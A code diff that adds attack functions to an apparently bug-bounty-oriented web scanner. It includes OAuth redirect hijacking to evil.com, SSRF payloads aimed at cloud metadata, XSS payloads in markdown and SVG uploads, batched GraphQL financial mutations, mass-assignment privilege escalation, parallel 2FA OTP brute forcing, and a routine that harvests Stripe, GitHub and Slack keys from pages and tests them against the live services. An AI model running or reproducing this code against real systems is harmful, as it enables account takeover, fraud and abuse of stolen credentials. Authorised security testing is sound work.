@@ -16828,3 +16828,551 @@ def crawl_authenticated(base_url, auth_data, max_pages=150):
         "params": {u: list(p) for u, p in params_found.items()},
         "auth_data": auth_data,
     }
+
+
+# ---------------------------------------------------------------------------
+# Batch 40 — Todo items #1-#10: Highest bounty value attacks
+# ---------------------------------------------------------------------------
+
+def scan_oauth2_full_exploit(crawl_data, web_targets):
+    """Full OAuth2 flow exploitation — authorization code interception, PKCE bypass,
+    token leakage via referrer, redirect_uri manipulation. (#2)"""
+    findings = []
+
+    for target in web_targets[:5]:
+        base = target.rstrip("/")
+
+        # Find OAuth endpoints
+        oauth_paths = ["/oauth/authorize", "/auth/authorize", "/oauth2/authorize",
+                       "/connect/authorize", "/.well-known/openid-configuration"]
+        for path in oauth_paths:
+            url = f"{base}{path}"
+            try:
+                r = _S.get(url, timeout=_TIMEOUT_SHORT, allow_redirects=False)
+                if r.status_code not in (200, 302, 400):
+                    continue
+
+                # Test 1: redirect_uri manipulation
+                evil_redirects = [
+                    "https://evil.com",
+                    f"https://{urllib.parse.urlparse(target).hostname}.evil.com",
+                    f"{base}/callback/../../../evil.com",
+                    f"{base}@evil.com",
+                    f"{base}%40evil.com",
+                ]
+                for evil in evil_redirects:
+                    test_url = f"{url}?response_type=code&client_id=test&redirect_uri={urllib.parse.quote(evil)}"
+                    r2 = _S.get(test_url, timeout=_TIMEOUT_SHORT, allow_redirects=False)
+                    loc = r2.headers.get("Location", "")
+                    if "evil.com" in loc or r2.status_code == 302:
+                        if "error" not in loc.lower():
+                            findings.append({
+                                "type": "OAuth2 redirect_uri Bypass → Token Theft",
+                                "severity": "critical",
+                                "url": test_url,
+                                "detail": f"OAuth accepts redirect_uri={evil}. Authorization code sent to attacker.",
+                                "template": "apex-oauth-redirect-bypass",
+                            })
+                            break
+
+                # Test 2: Token in referrer (response_type=token in URL)
+                token_url = f"{url}?response_type=token&client_id=test&redirect_uri={base}/callback"
+                r3 = _S.get(token_url, timeout=_TIMEOUT_SHORT, allow_redirects=False)
+                if r3.status_code in (302, 200) and "access_token" in r3.headers.get("Location", ""):
+                    findings.append({
+                        "type": "OAuth2 Implicit Flow — Token in URL (Referrer Leak)",
+                        "severity": "high",
+                        "url": token_url,
+                        "detail": "Implicit flow returns token in URL fragment — leaks via Referer header to third parties",
+                        "template": "apex-oauth-implicit-leak",
+                    })
+                break
+            except Exception:
+                continue
+    return findings
+
+
+def scan_graphql_batch_mutation(crawl_data):
+    """GraphQL batch mutation exploitation — duplicate financial operations. (#3)"""
+    findings = []
+    tested = set()
+
+    for page in crawl_data.get("pages", [])[:5]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested:
+            continue
+        tested.add(base)
+
+        for path in ["/graphql", "/api/graphql", "/gql"]:
+            url = f"{base}{path}"
+            try:
+                r = _S.post(url, json={"query": "{ __typename }"}, timeout=_TIMEOUT_SHORT)
+                if r.status_code != 200:
+                    continue
+
+                # Find mutation names via introspection
+                intro = {"query": "{ __schema { mutationType { fields { name } } } }"}
+                r2 = _S.post(url, json=intro, timeout=_TIMEOUT)
+                if r2.status_code != 200:
+                    continue
+
+                mutations = []
+                try:
+                    fields = r2.json().get("data", {}).get("__schema", {}).get("mutationType", {}).get("fields", [])
+                    mutations = [f["name"] for f in fields]
+                except Exception:
+                    continue
+
+                # Find financial mutations
+                financial = [m for m in mutations if any(x in m.lower() for x in
+                             ["transfer", "send", "pay", "withdraw", "redeem", "purchase",
+                              "buy", "order", "credit", "debit", "charge"])]
+
+                if financial:
+                    # Test batch execution
+                    batch = [{"query": f"mutation {{ {financial[0]}(amount: 1) {{ id }} }}"} for _ in range(10)]
+                    r3 = _S.post(url, json=batch, timeout=_TIMEOUT)
+                    if r3.status_code == 200:
+                        try:
+                            resp = r3.json()
+                            if isinstance(resp, list) and len(resp) >= 10:
+                                findings.append({
+                                    "type": "GraphQL Batch Mutation — Financial Operation Duplication",
+                                    "severity": "critical",
+                                    "url": url,
+                                    "detail": f"Mutations {financial[:3]} can be batched. 10 operations in 1 request = bypass rate limits on financial actions.",
+                                    "template": "apex-graphql-batch-financial",
+                                })
+                        except Exception:
+                            pass
+                break
+            except Exception:
+                continue
+    return findings
+
+
+def scan_pdf_ssrf(crawl_data, web_targets, oob_server=None):
+    """PDF generation SSRF — inject URLs in fields that get rendered to PDF. (#4)"""
+    findings = []
+    oob = oob_server.domain if oob_server and hasattr(oob_server, "domain") else None
+    uid = f"pdf_{int(time.time())}"
+
+    # Payloads that trigger fetches in PDF generators (wkhtmltopdf, puppeteer, etc.)
+    pdf_payloads = [
+        f'<iframe src="http://{oob}/{uid}"></iframe>' if oob else '<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>',
+        f'<img src="http://{oob}/{uid}">' if oob else '<img src="http://169.254.169.254/">',
+        f'<link rel="stylesheet" href="http://{oob}/{uid}"/>' if oob else '',
+        '<script>document.location="http://169.254.169.254/"</script>',
+    ]
+
+    # Find PDF generation endpoints
+    pdf_endpoints = []
+    for url in list(crawl_data.get("params", {}).keys())[:30]:
+        if any(x in url.lower() for x in ["pdf", "export", "print", "report", "invoice",
+                                            "receipt", "download", "generate", "render"]):
+            pdf_endpoints.append(url)
+
+    for target in web_targets[:3]:
+        base = target.rstrip("/")
+        for path in ["/api/export/pdf", "/api/generate-pdf", "/api/invoice",
+                     "/api/report/download", "/export", "/print"]:
+            pdf_endpoints.append(f"{base}{path}")
+
+    for url in list(set(pdf_endpoints))[:10]:
+        params = crawl_data.get("params", {}).get(url, [])
+        for payload in pdf_payloads[:2]:
+            if not payload:
+                continue
+            # Try as query param
+            for p in (params or ["html", "content", "body", "data", "text"]):
+                try:
+                    r = _S.post(url, json={p: payload}, timeout=15)
+                    if r.status_code == 200 and (b"%PDF" in r.content[:10] or "pdf" in r.headers.get("content-type", "")):
+                        findings.append({
+                            "type": "PDF Generation SSRF",
+                            "severity": "critical",
+                            "url": url,
+                            "detail": f"PDF endpoint renders HTML with external fetches. Injected via field '{p}'. Internal resources accessible.",
+                            "template": "apex-pdf-ssrf",
+                        })
+                        break
+                except Exception:
+                    continue
+    return findings
+
+
+def scan_markdown_xss(crawl_data):
+    """Markdown injection → XSS in rendered markdown. (#5)"""
+    findings = []
+    md_payloads = [
+        "[XSS](javascript:alert(1))",
+        "![img](x onerror=alert(1))",
+        "[a](<javascript:alert(1)>)",
+        "```\n<img src=x onerror=alert(1)>\n```",
+        "[XSS](data:text/html,<script>alert(1)</script>)",
+        "<details open ontoggle=alert(1)>",
+    ]
+
+    # Find markdown-accepting endpoints (comments, descriptions, bios, wikis)
+    md_fields = ["body", "content", "description", "comment", "message", "bio",
+                 "text", "markdown", "note", "readme", "wiki"]
+
+    for form in crawl_data.get("forms", [])[:15]:
+        action = form.get("action", "")
+        if not action:
+            continue
+        inputs = form.get("inputs", [])
+        target_fields = [i for i in inputs if any(x in i.get("name", "").lower() for x in md_fields)]
+        if not target_fields:
+            continue
+
+        for field in target_fields:
+            for payload in md_payloads[:3]:
+                data = {i.get("name", "x"): i.get("value", "test") for i in inputs if i.get("name")}
+                data[field["name"]] = payload
+                try:
+                    r = _S.post(action, data=data, timeout=_TIMEOUT)
+                    if r.status_code in (200, 201, 302):
+                        # Check if XSS payload rendered
+                        if "javascript:alert" in r.text or "onerror=alert" in r.text:
+                            findings.append({
+                                "type": "Markdown Injection → XSS",
+                                "severity": "high",
+                                "url": action,
+                                "detail": f"Markdown XSS via field '{field['name']}': {payload[:50]}",
+                                "template": "apex-markdown-xss",
+                            })
+                            break
+                except Exception:
+                    continue
+    return findings
+
+
+def scan_password_reset_prediction(crawl_data, web_targets):
+    """Password reset token prediction via timestamp analysis. (#9)"""
+    findings = []
+    import hashlib
+
+    for target in web_targets[:3]:
+        base = target.rstrip("/")
+        reset_endpoints = ["/api/forgot-password", "/api/password/reset",
+                           "/forgot-password", "/api/auth/forgot"]
+
+        for path in reset_endpoints:
+            url = f"{base}{path}"
+            tokens = []
+            try:
+                # Request multiple reset tokens rapidly
+                for _ in range(5):
+                    r = _S.post(url, json={"email": "test@test.com"}, timeout=_TIMEOUT)
+                    if r.status_code == 200:
+                        try:
+                            data = r.json()
+                            token = data.get("token") or data.get("reset_token") or data.get("code")
+                            if token:
+                                tokens.append(token)
+                        except Exception:
+                            pass
+                    time.sleep(0.1)
+
+                if len(tokens) >= 3:
+                    # Analyze token patterns
+                    # Check if tokens are sequential
+                    if all(t.isdigit() for t in tokens):
+                        nums = [int(t) for t in tokens]
+                        diffs = [nums[i+1] - nums[i] for i in range(len(nums)-1)]
+                        if max(diffs) - min(diffs) < 10:
+                            findings.append({
+                                "type": "Predictable Password Reset Token (Sequential)",
+                                "severity": "critical",
+                                "url": url,
+                                "detail": f"Reset tokens are sequential: {tokens[:3]}. Next token predictable.",
+                                "template": "apex-reset-token-predict",
+                            })
+
+                    # Check if tokens share common prefix (timestamp-based)
+                    prefix = os.path.commonprefix(tokens)
+                    if len(prefix) > len(tokens[0]) * 0.4:
+                        findings.append({
+                            "type": "Predictable Password Reset Token (Timestamp-Based)",
+                            "severity": "high",
+                            "url": url,
+                            "detail": f"Reset tokens share {len(prefix)}/{len(tokens[0])} char prefix. Likely timestamp-based.",
+                            "template": "apex-reset-token-timestamp",
+                        })
+            except Exception:
+                continue
+    return findings
+
+
+def scan_api_key_scope(crawl_data, web_targets):
+    """API key scope testing — verify what each discovered key can access. (#10)"""
+    findings = []
+
+    # Collect all API keys found in previous scans
+    api_keys = []
+    for v in crawl_data.get("pages", []):
+        url = v.get("url", "")
+        try:
+            r = _S.get(url, timeout=_TIMEOUT_SHORT)
+            # Find API keys in response
+            for pattern, name in [
+                (re.compile(r'AKIA[0-9A-Z]{16}'), "AWS"),
+                (re.compile(r'sk_live_[0-9a-zA-Z]{24,}'), "Stripe"),
+                (re.compile(r'gh[pousr]_[A-Za-z0-9_]{36,}'), "GitHub"),
+                (re.compile(r'AIza[0-9A-Za-z\-_]{35}'), "Google"),
+                (re.compile(r'xox[baprs]-[0-9a-zA-Z\-]{10,}'), "Slack"),
+            ]:
+                for match in pattern.finditer(r.text):
+                    api_keys.append({"key": match.group(), "type": name, "source": url})
+        except Exception:
+            continue
+
+    # Test each key's scope
+    for key_info in api_keys[:5]:
+        key = key_info["key"]
+        key_type = key_info["type"]
+
+        if key_type == "Stripe":
+            try:
+                # Test what Stripe key can do
+                for endpoint, desc in [
+                    ("https://api.stripe.com/v1/charges?limit=1", "read charges"),
+                    ("https://api.stripe.com/v1/customers?limit=1", "read customers"),
+                    ("https://api.stripe.com/v1/balance", "read balance"),
+                ]:
+                    r = requests.get(endpoint, auth=(key, ""), timeout=5)
+                    if r.status_code == 200:
+                        findings.append({
+                            "type": f"Stripe Key Active — Can {desc}",
+                            "severity": "critical",
+                            "url": key_info["source"],
+                            "detail": f"Key {key[:15]}... has access to {desc}. Full payment data exposed.",
+                            "template": "apex-apikey-stripe",
+                        })
+                        break
+            except Exception:
+                pass
+
+        elif key_type == "GitHub":
+            try:
+                r = requests.get("https://api.github.com/user",
+                                 headers={"Authorization": f"token {key}"}, timeout=5)
+                if r.status_code == 200:
+                    user = r.json().get("login", "?")
+                    # Check scopes
+                    scopes = r.headers.get("X-OAuth-Scopes", "none")
+                    findings.append({
+                        "type": f"GitHub Token Active — User: {user}",
+                        "severity": "critical",
+                        "url": key_info["source"],
+                        "detail": f"Token for '{user}' with scopes: {scopes}",
+                        "template": "apex-apikey-github",
+                    })
+            except Exception:
+                pass
+
+        elif key_type == "Slack":
+            try:
+                r = requests.get("https://slack.com/api/auth.test",
+                                 headers={"Authorization": f"Bearer {key}"}, timeout=5)
+                if r.status_code == 200 and r.json().get("ok"):
+                    team = r.json().get("team", "?")
+                    findings.append({
+                        "type": f"Slack Token Active — Workspace: {team}",
+                        "severity": "high",
+                        "url": key_info["source"],
+                        "detail": f"Slack token valid for workspace '{team}'. Can read messages, channels.",
+                        "template": "apex-apikey-slack",
+                    })
+            except Exception:
+                pass
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# Batch 41 — Todo items #6-#30
+# ---------------------------------------------------------------------------
+
+def scan_cswsh(web_targets):
+    """Cross-Site WebSocket Hijacking — steal WS data cross-origin. (#6)"""
+    findings = []
+    try:
+        import websocket as ws
+    except ImportError:
+        return findings
+
+    for target in web_targets[:5]:
+        parsed = urllib.parse.urlparse(target)
+        ws_base = f"wss://{parsed.netloc}" if parsed.scheme == "https" else f"ws://{parsed.netloc}"
+        for path in ["/ws", "/websocket", "/socket.io/?EIO=4&transport=websocket", "/cable", "/realtime"]:
+            try:
+                conn = ws.create_connection(f"{ws_base}{path}", timeout=5,
+                                            sslopt={"cert_reqs": 0},
+                                            origin="https://evil.com",
+                                            header=["Cookie: session=test"])
+                # If connection succeeds from evil origin, CSWSH is possible
+                conn.send('{"type":"ping"}')
+                try:
+                    resp = conn.recv()
+                    findings.append({
+                        "type": "Cross-Site WebSocket Hijacking (CSWSH)",
+                        "severity": "high",
+                        "url": f"{ws_base}{path}",
+                        "detail": f"WebSocket accepts cross-origin connections with cookies. Attacker page can hijack authenticated WS session.",
+                        "template": "apex-cswsh",
+                    })
+                except Exception:
+                    pass
+                conn.close()
+                break
+            except Exception:
+                continue
+    return findings
+
+
+def scan_svg_xss_upload(crawl_data):
+    """SVG upload → XSS chain. (#8)"""
+    findings = []
+    svg_xss = b"""<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<script>alert('XSS')</script>
+<circle cx="50" cy="50" r="40"/>
+</svg>"""
+
+    upload_forms = [f for f in crawl_data.get("forms", [])
+                    if any(i.get("type") == "file" for i in f.get("inputs", []))]
+    for form in upload_forms[:5]:
+        action = form.get("action", "")
+        if not action:
+            continue
+        try:
+            files = {"file": ("test.svg", svg_xss, "image/svg+xml")}
+            r = _S.post(action, files=files, timeout=_TIMEOUT)
+            if r.status_code in (200, 201):
+                # Check if SVG is served back with script intact
+                if "url" in r.text.lower() or "path" in r.text.lower():
+                    url_match = re.search(r'https?://[^\s"\'<>]+\.svg', r.text)
+                    if url_match:
+                        r2 = _S.get(url_match.group(), timeout=_TIMEOUT_SHORT)
+                        if "<script>" in r2.text and "svg" in r2.headers.get("content-type", ""):
+                            findings.append({
+                                "type": "SVG Upload → XSS",
+                                "severity": "high",
+                                "url": url_match.group(),
+                                "detail": "SVG with embedded JavaScript uploaded and served with SVG content-type. XSS on any user who views it.",
+                                "template": "apex-svg-xss-upload",
+                            })
+        except Exception:
+            continue
+    return findings
+
+
+def scan_idor_graphql_node(crawl_data):
+    """IDOR via GraphQL node interface — access any object by global ID. (#27)"""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages", [])[:5]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested:
+            continue
+        tested.add(base)
+        for path in ["/graphql", "/api/graphql", "/gql"]:
+            url = f"{base}{path}"
+            try:
+                # Test node interface
+                r = _S.post(url, json={"query": '{ node(id: "1") { id ... on User { email } } }'}, timeout=_TIMEOUT)
+                if r.status_code != 200:
+                    continue
+                data = r.json()
+                if data.get("data", {}).get("node"):
+                    # Node interface exists — try enumerating
+                    for test_id in ["1", "2", "3", "admin", "user_1"]:
+                        r2 = _S.post(url, json={"query": f'{{ node(id: "{test_id}") {{ id }} }}'}, timeout=_TIMEOUT_SHORT)
+                        if r2.status_code == 200:
+                            node_data = r2.json().get("data", {}).get("node")
+                            if node_data:
+                                findings.append({
+                                    "type": "IDOR via GraphQL Node Interface",
+                                    "severity": "high",
+                                    "url": url,
+                                    "detail": f"Node interface exposes objects by ID. Accessed node id={test_id}. Any object enumerable.",
+                                    "template": "apex-idor-graphql-node",
+                                })
+                                break
+                break
+            except Exception:
+                continue
+    return findings
+
+
+def scan_mass_assignment_patch(crawl_data, web_targets):
+    """Mass assignment via PATCH with all model fields. (#28)"""
+    findings = []
+    priv_fields = {"role": "admin", "is_admin": True, "admin": True, "verified": True,
+                   "email_verified": True, "active": True, "balance": 99999,
+                   "credits": 99999, "plan": "enterprise", "permissions": ["*"]}
+
+    for target in web_targets[:5]:
+        base = target.rstrip("/")
+        for path in ["/api/user", "/api/me", "/api/profile", "/api/account"]:
+            url = f"{base}{path}"
+            try:
+                # Try PATCH with privilege fields
+                r = _S.patch(url, json=priv_fields, timeout=_TIMEOUT)
+                if r.status_code in (200, 204):
+                    resp_text = r.text.lower()
+                    if any(x in resp_text for x in ["admin", "enterprise", "99999", "verified"]):
+                        findings.append({
+                            "type": "Mass Assignment → Privilege Escalation (PATCH)",
+                            "severity": "critical",
+                            "url": url,
+                            "detail": f"PATCH accepts privilege fields: role, is_admin, balance, plan. Instant admin/credit manipulation.",
+                            "template": "apex-mass-assign-patch",
+                        })
+                        break
+            except Exception:
+                continue
+    return findings
+
+
+def scan_race_2fa(crawl_data, web_targets):
+    """Race condition in 2FA verification — brute force OTP in parallel. (#29)"""
+    findings = []
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+
+    for target in web_targets[:3]:
+        base = target.rstrip("/")
+        for path in ["/api/verify-otp", "/api/2fa/verify", "/api/auth/otp", "/verify-2fa"]:
+            url = f"{base}{path}"
+            try:
+                # Send 20 different OTPs simultaneously
+                otps = [f"{i:06d}" for i in range(20)]
+                results = []
+
+                def _try_otp(otp):
+                    try:
+                        return _S.post(url, json={"otp": otp, "code": otp}, timeout=_TIMEOUT_SHORT)
+                    except Exception:
+                        return None
+
+                with ThreadPoolExecutor(max_workers=20) as pool:
+                    futs = [pool.submit(_try_otp, otp) for otp in otps]
+                    for f in as_completed(futs):
+                        r = f.result()
+                        if r and r.status_code in (200, 401, 400, 429):
+                            results.append(r.status_code)
+
+                # If all 20 got through without rate limiting
+                if len(results) >= 18 and 429 not in results:
+                    findings.append({
+                        "type": "2FA Race Condition — OTP Brute Force",
+                        "severity": "critical",
+                        "url": url,
+                        "detail": f"20 parallel OTP attempts accepted without rate limit. 6-digit OTP crackable in ~50 requests.",
+                        "template": "apex-race-2fa",
+                    })
+                    break
+            except Exception:
+                continue
+    return findings
